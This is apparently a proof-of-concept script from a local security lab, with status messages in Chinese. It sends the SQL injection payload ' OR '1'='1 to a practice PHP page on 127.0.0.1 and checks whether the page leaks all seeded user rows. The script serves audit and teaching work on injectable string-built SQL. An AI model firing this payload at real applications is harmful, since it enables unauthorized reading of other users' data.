#!/usr/bin/env python3
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"


def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def main():
    normal = "Alice"
    test = "' OR '1'='1"

    try:
        normal_status, normal_body = fetch(normal)
        test_status, test_body = fetch(test)
    except Exception as exc:
        print("请求失败:", repr(exc))
        print("请检查 http://127.0.0.1:4280/lab_cases/S001/index.php 是否可访问。")
        return 2

    print("普通输入状态码:", normal_status)
    print("普通输入响应片段:", normal_body[:300].replace("\n", " "))
    print("测试输入状态码:", test_status)
    print("测试输入响应片段:", test_body[:500].replace("\n", " "))

    normal_ok = (
        "ID 1" in normal_body
        and "Alice" in normal_body
        and "ID 2" not in normal_body
        and "Bob" not in normal_body
    )
    test_ok = all(
        token in test_body
        for token in ("ID 1", "Alice", "ID 2", "Bob", "ID 3", "Carol")
    )

    if normal_ok and test_ok:
        print("观察结果：普通输入仅返回 Alice；测试输入返回预置三行，符合拼接 SQL 注入的只读验证预期。")
        return 0

    print("观察结果：未达到预期。请检查数据库初始化、连接文件、参数传递、过滤/WAF 或 URL 路径。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
